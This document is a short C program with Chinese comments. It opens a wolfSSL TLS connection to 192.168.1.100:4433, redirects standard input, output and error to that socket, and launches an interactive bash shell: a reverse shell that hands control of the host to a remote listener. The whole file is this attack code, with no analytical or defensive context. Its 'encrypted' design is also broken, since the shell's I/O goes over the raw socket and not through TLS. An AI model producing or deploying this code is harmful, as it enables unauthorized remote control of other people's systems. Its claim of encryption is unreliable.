#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <wolfssl/ssl.h>

#define IP "192.168.1.100"
#define PORT 4433
#define CA_CERT "../certs/ca-cert.pem"

int main() {
    WOLFSSL_CTX* ctx;
    WOLFSSL* ssl;
    int sockfd;
    struct sockaddr_in addr;

    // 初始化WolfSSL
    wolfSSL_Init();
    ctx = wolfSSL_CTX_new(wolfTLSv1_2_client_method());
    wolfSSL_CTX_load_verify_locations(ctx, CA_CERT, NULL);

    // 创建TCP连接
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    inet_pton(AF_INET, IP, &addr.sin_addr);
    
    connect(sockfd, (struct sockaddr*)&addr, sizeof(addr));
    
    // 建立SSL连接
    ssl = wolfSSL_new(ctx);
    wolfSSL_set_fd(ssl, sockfd);
    if (wolfSSL_connect(ssl) != SSL_SUCCESS) {
        fprintf(stderr, "SSL连接失败\n");
        exit(EXIT_FAILURE);
    }

    // 重定向标准I/O
    dup2(wolfSSL_get_fd(ssl), STDIN_FILENO);
    dup2(wolfSSL_get_fd(ssl), STDOUT_FILENO);
    dup2(wolfSSL_get_fd(ssl), STDERR_FILENO);

    // 执行交互式Shell
    char *argv[] = {"/bin/bash", "-i", NULL};
    execve("/bin/bash", argv, NULL);

    wolfSSL_free(ssl);
    wolfSSL_CTX_free(ctx);
    wolfSSL_Cleanup();
    return 0;
}
